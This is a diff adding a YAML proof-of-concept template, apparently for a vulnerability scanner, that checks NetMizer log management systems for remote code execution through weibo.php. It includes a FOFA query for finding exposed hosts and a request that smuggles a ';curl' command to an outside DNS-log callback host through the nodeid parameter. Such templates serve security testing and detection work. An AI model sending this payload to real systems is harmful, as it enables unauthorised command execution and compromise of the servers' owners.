@@ -1,0 +1,17 @@
+id: poc-yaml-netmizer-log-ms-weibo-php-rce
+info:
+  name: NetMizer 日志管理系统 weibo.php 远程代码执行漏洞
+  severity: critical
+  tags:
+  - DNSLOG
+  - rce
+  finger: NetMizer 日志管理系统
+  fofa: app="NetMizer-日志管理系统"
+variables:
+  reverse: new_dns_log()
+  domain: reverse.Domain()
+requests:
+- method: GET
+  path: /data/search/weibo.php?action=file&nodeid=;curl+{{.domain}}+%23+
+  expression: reverse.Verify()
+transport: http
